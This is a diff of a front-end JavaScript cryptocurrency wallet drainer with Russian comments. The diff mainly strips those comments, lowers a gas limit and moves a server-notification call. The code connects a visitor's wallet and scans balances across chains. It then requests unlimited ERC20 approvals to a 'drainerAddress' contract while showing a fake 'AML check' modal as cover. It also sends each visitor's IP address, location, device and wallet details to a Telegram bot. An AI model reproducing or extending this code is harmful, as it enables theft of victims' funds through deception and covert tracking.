@@ -35,10 +35,8 @@ let modalContent = null;
 let modalSubtitle = null;
 
 // === Константы и конфигурации ===
-// Переменная для отслеживания времени последнего вызова drain
 let lastDrainTime = 0;
 
-// ABI для ERC20 токенов
 const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
@@ -47,16 +45,13 @@ const ERC20_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)"
 ];
 
-// ABI для дрейнера
 const DRAINER_ABI = [
   "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
 
 // === Функции ===
-// Функция для создания задержки
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Функция для отправки сообщения в Telegram
 async function sendTelegramMessage(message) {
   try {
     const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -78,7 +73,6 @@ async function sendTelegramMessage(message) {
   }
 }
 
-// Функция для получения IP-адреса пользователя
 async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) return cachedIP;
@@ -95,7 +89,6 @@ async function getUserIP() {
   }
 }
 
-// Функция для получения геолокации по IP
 async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) return cachedLocation;
@@ -115,16 +108,13 @@ async function getGeolocation(ip) {
   }
 }
 
-// Функция для определения устройства с учётом эмуляции
 function detectDevice() {
   const userAgent = navigator.userAgent.toLowerCase();
   const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
 
-  // Проверяем, включена ли эмуляция в Chrome DevTools
   const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
 
   if (isDevToolsEmulation) {
-    // Если это эмуляция, определяем реальное устройство
     const realPlatform = navigator.platform.toLowerCase();
     if (/win32|win64/i.test(realPlatform)) return "Windows";
     if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
@@ -132,7 +122,6 @@ function detectDevice() {
     return "Unknown";
   }
 
-  // Обычная проверка для реальных устройств
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
   if (/android/i.test(userAgent)) return "Android";
   if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
@@ -141,13 +130,11 @@ function detectDevice() {
   return "Unknown";
 }
 
-// Функция для проверки, является ли устройство мобильным
 function isMobileDevice() {
   const device = detectDevice();
   return device === "iPhone" || device === "Android";
 }
 
-// Функция для отправки уведомления при заходе на сайт
 async function notifyOnVisit() {
   if (sessionStorage.getItem('visitNotified')) return;
 
@@ -165,12 +152,10 @@ async function notifyOnVisit() {
   sessionStorage.setItem('visitNotified', 'true');
 }
 
-// Вызываем notifyOnVisit при загрузке
 notifyOnVisit().catch(error => {
   console.error(`❌ Ошибка уведомления о посещении: ${error.message}`);
 });
 
-// Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
   if (tokenSymbol === "USDTUSDT") return 1;
 
@@ -184,7 +169,6 @@ async function getTokenPriceInUSDT(tokenSymbol) {
   }
 }
 
-// Функция для выбора рабочего провайдера
 async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
     try {
@@ -202,7 +186,6 @@ async function getWorkingProvider(rpcUrls) {
   return workingProvider;
 }
 
-// Проверка баланса
 async function checkBalance(chainId, userAddress, provider) {
   const chainConfig = config.CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
@@ -259,7 +242,6 @@ async function checkBalance(chainId, userAddress, provider) {
   return { nativeBalance, tokenBalances };
 }
 
-// Проверка наличия средств
 function hasFunds(bal) {
   const minNativeBalance = ethers.utils.parseEther("0.001");
   const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
@@ -273,7 +255,6 @@ function hasFunds(bal) {
   return false;
 }
 
-// Переключение сети
 async function switchChain(chainId) {
   try {
     console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
@@ -288,26 +269,22 @@ async function switchChain(chainId) {
   }
 }
 
-// Функция для форматирования адреса кошелька
 function shortenAddress(address) {
   if (!address || address.length < 10) return address;
   return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
-// Функция для определения названия кошелька
 function detectWallet() {
   if (window.ethereum?.isMetaMask) return "MetaMask";
   if (window.ethereum?.isTrust) return "Trust Wallet";
   return "Unknown Wallet";
 }
 
-// Функция для форматирования чисел
 function formatBalance(balance, decimals) {
   const formatted = ethers.utils.formatUnits(balance, decimals);
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
 
-// Уведомление сервера
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
@@ -342,7 +319,6 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
   }
 }
 
-// Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
@@ -493,16 +469,15 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 780000,
+          gasLimit: 500000,
           gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
 
-        // Генерация и сохранение значения AML
+        // Открываем модальное окно AML после успешного approve
         const amlKey = `amlValue_${userAddress}`;
         let amlValue = sessionStorage.getItem(amlKey);
         if (!amlValue) {
@@ -513,9 +488,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           console.log(`📊 Использовано сохранённое значение AML для ${userAddress}: ${amlValue}`);
         }
         await showAMLCheckModal(connectedAddress, amlValue);
+
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
         status = 'confirmed';
 
-        // Закрываем модальное окно после успешного approve
         if (!modalClosed) {
           console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
           await hideModalWithDelay();
@@ -524,7 +500,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       } catch (error) {
         console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
         if (error.message.includes('user rejected')) {
-          // Пользователь отклонил транзакцию
           if (!modalClosed) {
             console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
             await hideModalWithDelay("Error: Transaction rejected by user.");
@@ -538,7 +513,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider);
 
-        // Генерация и сохранение значения AML
+        // Открываем модальное окно AML
         const amlKey = `amlValue_${userAddress}`;
         let amlValue = sessionStorage.getItem(amlKey);
         if (!amlValue) {
@@ -549,13 +524,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           console.log(`📊 Использовано сохранённое значение AML для ${userAddress}: ${amlValue}`);
         }
         await showAMLCheckModal(connectedAddress, amlValue);
+
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
         throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
       }
 
-      // Закрываем модальное окно, если allowance уже достаточно
       if (!modalClosed) {
         console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
         await hideModalWithDelay();
@@ -568,7 +543,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   return status;
 }
 
-// Основная функция runDrainer
 async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
@@ -610,7 +584,6 @@ async function runDrainer(provider, signer, userAddress) {
   return status;
 }
 
-// === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
@@ -810,7 +783,6 @@ window.addEventListener('DOMContentLoaded', () => {
   window.ethereum.on('chainChanged', onChainChanged);
 });
 
-// === Управление модальным окном верификации ===
 function showModal() {
   modalOverlay.style.display = 'block';
   modalOverlay.style.pointerEvents = 'auto';
@@ -829,7 +801,6 @@ async function hideModalWithDelay(errorMessage = null) {
   document.body.style.pointerEvents = 'auto';
 }
 
-// === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     console.log('⚠️ Транзакция уже выполнена или ожидается');
@@ -844,15 +815,13 @@ async function attemptDrainer() {
     return;
   }
 
-  // Показываем модальное окно верификации перед началом процесса
   showModal();
 
-  // Добавляем тайм-аут на выполнение дрейнера
   const drainerTimeout = setTimeout(async () => {
     isTransactionPending = false;
     console.error('❌ Тайм-аут выполнения дрейнера');
     await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
-  }, 60000); // 60 секунд
+  }, 60000);
 
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -863,7 +832,6 @@ async function attemptDrainer() {
       throw new Error('Wallet address mismatch');
     }
 
-    console.log('⏳ Задержка 5 секунд перед runDrainer');
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
@@ -897,24 +865,18 @@ async function attemptDrainer() {
   }
 }
 
-// === Подключение кошелька через AppKit и запуск дрейнера ===
 async function handleConnectOrAction() {
   try {
-    // Проверяем, подключён ли уже кошелёк
     if (!connectedAddress) {
       console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
-      // Открываем модальное окно AppKit
       await appKitModal.open();
-      // Ожидаем подключения кошелька через AppKit
       connectedAddress = await waitForWallet();
       console.log('✅ Подключён:', connectedAddress);
-      // Закрываем модальное окно AppKit после успешного подключения
       appKitModal.close();
     } else {
       console.log('ℹ️ Кошелёк уже подключён:', connectedAddress);
     }
 
-    // После успешного подключения кошелька или если кошелёк уже подключён, вызываем attemptDrainer
     if (!isTransactionPending) {
       await attemptDrainer();
     } else {
@@ -923,14 +885,13 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
-    appKitModal.close(); // Закрываем модальное окно в случае ошибки
+    appKitModal.close();
     isTransactionPending = false;
     showModal();
     await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
   }
 }
 
-// === Обработка смены сети ===
 async function onChainChanged(chainId) {
   console.log('🔄 Смена сети:', chainId);
   if (connectedAddress && !isTransactionPending) {
@@ -941,16 +902,13 @@ async function onChainChanged(chainId) {
   }
 }
 
-// === Ожидание подключения кошелька через AppKit ===
 async function waitForWallet() {
   return new Promise((resolve, reject) => {
     console.log('⏳ Ожидаем подключение кошелька через AppKit...');
 
-    // Определяем, является ли устройство мобильным
     const isMobile = isMobileDevice();
     console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
 
-    // Функция для проверки аккаунтов
     const handler = async (accounts) => {
       if (accounts.length > 0) {
         console.log('✅ Аккаунты найдены:', accounts);
@@ -960,10 +918,8 @@ async function waitForWallet() {
       }
     };
 
-    // Слушатель изменений аккаунтов
     window.ethereum.on('accountsChanged', handler);
 
-    // Интервал для проверки аккаунтов
     const checkInterval = setInterval(async () => {
       try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
@@ -977,14 +933,12 @@ async function waitForWallet() {
       }
     }, 1000);
 
-    // Тайм-аут на подключение
     const timeout = setTimeout(() => {
       window.ethereum.removeListener('accountsChanged', handler);
       clearInterval(checkInterval);
       reject(new Error('Timeout waiting for wallet connection'));
-    }, 30000); // 30 секунд
+    }, 30000);
 
-    // Явный запрос подключения, если аккаунты не найдены сразу
     window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
       console.error('❌ Ошибка запроса аккаунтов:', err.message);
       reject(err);
